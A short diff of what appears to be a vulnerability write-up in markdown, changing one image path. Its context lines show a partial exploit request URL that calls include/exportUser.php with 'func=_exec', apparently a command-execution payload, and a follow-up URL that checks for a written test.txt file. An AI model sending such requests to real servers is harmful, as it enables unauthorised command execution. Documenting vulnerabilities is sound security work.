@@ -64,4 +64,4 @@ http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&
 http://xxx.xxx.xxx.xxx/include/test.txt
 ```
 
-![](./images/202202101951230.png)
+![](images/202202101951230.png)
